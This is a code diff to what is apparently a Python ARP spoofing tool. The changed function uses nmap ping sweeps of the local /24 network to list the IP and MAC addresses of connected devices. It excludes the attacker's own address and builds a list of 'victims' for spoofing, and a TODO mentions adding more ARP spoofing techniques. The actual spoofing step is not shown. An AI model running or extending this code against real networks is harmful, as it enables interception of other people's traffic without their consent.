@@ -21,21 +21,15 @@ def initialize():
     attackerMAC = commandOutput[2].split()[1]
     broadcastIP = commandOutput[1].split()[-1]
 
-    command = "nmap "+ routerIP +"/24 -n -sP | grep report | awk '{print $5}'" # discover users connected
+    command = "nmap "+ routerIP +"/24 -n -sP | grep 'report\|MAC'" # discover users connected
     commandOutput = str(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT))
-    connectedDevices = commandOutput[2:].split('\\n')[1:-1] #remove first and last element because they are not clients
-    connectedDevices.pop(connectedDevices.index(attackerIP))
+    connectedDevices = commandOutput[3:].split('\\n')[1:-1] #remove first element since it is the router
 
-    for ip in connectedDevices: # add them to the ARP table in order to get MAC
-        subprocess.call(["ping", ip, "-c", "2"])
-
-    command = "ip neigh"
-    commandOutput = str(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT))[2:].split('\\n')
-    victimList = [] # list we are going to use and po;ulate it with possible victims
-    for i in range(len(commandOutput)-1): #last element is ' so we ignore it
-        ip = commandOutput[i].split()[0]
-        mac = commandOutput[i].split()[4]
-        if ip != routerIP:
+    victimList = [] # list we are going to use and popsulate it with possible victims
+    for i in range(0, len(connectedDevices)-1, 2):
+        mac = connectedDevices[i].split()[2]
+        ip = connectedDevices[i+1].split()[4]
+        if ip != attackerIP:
             print(ip, mac)
             victimList.append(Victim([ip, mac]))
     network = Network([routerIP, routerMAC, broadcastIP])
@@ -58,6 +52,5 @@ if __name__ == '__main__':
     Detecting router needs testing
     
     Optional:
-        Make pinging work in the background without printing it to the user
         Implement different ARP spoofing techniques that user can select
     '''
